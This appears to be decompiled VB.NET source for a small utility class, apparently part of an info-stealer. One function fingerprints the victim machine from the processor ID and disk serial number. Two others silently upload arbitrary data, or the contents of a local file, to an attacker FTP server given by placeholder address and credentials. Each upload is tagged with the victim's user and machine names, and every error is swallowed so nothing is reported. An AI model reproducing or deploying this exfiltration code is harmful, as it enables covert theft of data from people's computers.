﻿Imports System
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Text

Namespace Complex
	' Token: 0x0200000C RID: 12
	Friend NotInheritable Class UtilMe
		' Token: 0x0600004A RID: 74 RVA: 0x0000848C File Offset: 0x0000668C
		Public Shared Function UniqID() As String
			Dim str As String = String.Empty
			Dim managementClass As ManagementClass = New ManagementClass("win32_processor")
			Dim instances As ManagementObjectCollection = managementClass.GetInstances()
			Using enumerator As ManagementObjectCollection.ManagementObjectEnumerator = instances.GetEnumerator()
				If enumerator.MoveNext() Then
					Dim managementObject As ManagementObject = CType(enumerator.Current, ManagementObject)
					str = managementObject.Properties("processorID").Value.ToString()
				End If
			End Using
			Dim str2 As String = "C"
			Dim managementObject2 As ManagementObject = New ManagementObject("win32_logicaldisk.deviceid=""" + str2 + ":""")
			managementObject2.[Get]()
			Dim str3 As String = managementObject2("VolumeSerialNumber").ToString()
			Return str3 + str
		End Function

		' Token: 0x0600004B RID: 75 RVA: 0x00008564 File Offset: 0x00006764
		Public Shared Sub Send(Optional FTPAddress As String = "URL", Optional ftpUsername As String = "USERNAME", Optional ftpPassword As String = "ACCESO", Optional InfData As String = "")
			Try
				Dim text As String = UtilMe.UniqID()
				Dim ftpWebRequest As FtpWebRequest = CType(WebRequest.Create(String.Concat(New String() { FTPAddress, "UserName=", Environment.UserName, "_MachineName=", Environment.MachineName, "_", text, ".txt" })), FtpWebRequest)
				ftpWebRequest.Method = "STOR"
				ftpWebRequest.Credentials = New NetworkCredential(ftpUsername, ftpPassword)
				Dim asciiencoding As ASCIIEncoding = New ASCIIEncoding()
				Dim bytes As Byte() = asciiencoding.GetBytes(InfData)
				ftpWebRequest.ContentLength = CLng(bytes.Length)
				Using requestStream As Stream = ftpWebRequest.GetRequestStream()
					requestStream.Write(bytes, 0, bytes.Length)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x0600004C RID: 76 RVA: 0x0000865C File Offset: 0x0000685C
		Public Shared Sub SendB(Optional FTPAddress As String = "URL", Optional ftpUsername As String = "USERNAME", Optional ftpPassword As String = "ACCESO", Optional localFilePath As String = "")
			Try
				Dim text As String = UtilMe.UniqID()
				Dim ftpWebRequest As FtpWebRequest = CType(WebRequest.Create(String.Concat(New String() { FTPAddress, "UserName=", Environment.UserName, "_MachineName=", Environment.MachineName, "_", text, ".txt" })), FtpWebRequest)
				ftpWebRequest.Method = "STOR"
				ftpWebRequest.Credentials = New NetworkCredential(ftpUsername, ftpPassword)
				Dim bytes As Byte()
				Using streamReader As StreamReader = New StreamReader(localFilePath)
					bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd())
				End Using
				ftpWebRequest.ContentLength = CLng(bytes.Length)
				Using requestStream As Stream = ftpWebRequest.GetRequestStream()
					requestStream.Write(bytes, 0, bytes.Length)
				End Using
			Catch
			End Try
		End Sub
	End Class
End Namespace
